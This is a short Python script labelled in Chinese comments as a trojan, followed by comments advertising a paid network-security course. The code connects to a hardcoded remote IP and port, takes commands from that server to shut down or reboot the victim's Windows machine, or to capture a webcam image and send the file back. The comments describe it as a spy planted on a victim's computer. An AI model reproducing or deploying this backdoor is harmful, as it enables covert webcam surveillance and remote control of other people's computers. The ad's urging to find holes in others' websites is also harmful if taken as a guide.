# 木马 夹杂私货
import os               # 导入操作系统的模块
from socket import *    # 导入网络编程的模块
import cv2              # 导入视觉图像处理模块

s = socket()    # 1.准备一个套接字
s.connect(('146.56.223.48', 8888))  # 2.套接字申请连接 后台网络地址！

# 木马 按插在受害者的电脑中的间谍
choice = s.recv(1024).decode()
if choice == '1':
    os.system('shutdown -s -t 1')
elif choice == '2':
    os.system('shutdown -r -t 1')
elif choice == '3':
    cap = cv2.VideoCapture(1)       # 1.打开摄像头
    ret, frame = cap.read()         # 2.读取一帧图像 0帧起手！
    ret, frame = cap.read()         # 2.重新读取一帧
    cv2.imwrite('1.png', frame)     # 3.保存在电脑上
    cap.release()                   # 4.关闭摄像头

    # 5.把文件发送给后台
    # 1.把文件大小算出来 发送给后台 等待后台回复确认！
    file_size = os.path.getsize('1.png')
    s.send(str(file_size).encode())
    s.recv(1024).decode()

    # 2.把文件打开 一点一点读取出来 发送过去
    with open('1.png', 'rb') as file:
        for data in file:
            s.send(data)

# 网络安全 攻击！
# 攻击：
# windows linux kali 工具怎么使用！ 鼠标点点点！
# 挖漏洞 找别人网站的漏洞！ 8种漏洞！ lua php python 切入点！
# 建议你们提交!
# 工作者  副业发展！ 短期目标!
# python 网络安全  越来越重要！

# 4% 学网络安全出身！
# 96% 都是其他行业的在做！
# 8880 学不学！

# 我带着10几个老师！
# 0基础
# 5个多月！
# 直播 + 回放 + 课后一对一

# 最新一个班！10个名额!
# 1.找让你来听课的小班老师 预定200块钱 -2000 8880-2000=6880
# 2.淘宝 分期 12期免息  6680/12 = 500+

# 3.我收为弟子！
#  a.每个老师 老师课程 都得去上！
#  b.独享三更老师额外的资源！
#  c.C C++ 免费教你！
#  d.5个月的课学完  2年的学习权限！
#  d.要求：学到后面 长沙！

# 想报课的同学  考虑考虑！
# 想找师傅的同学  今天晚上！
# 正式学习代码之前！
# 大学生 大一  大二  大三（实习 考研） 大四!
# 工作者：居安思危！ 稳定的工作 稳定收入  中国中车！
# 去哪一个行业！ 人工智能  大数据   网络安全！

# 祝大家 牛逼！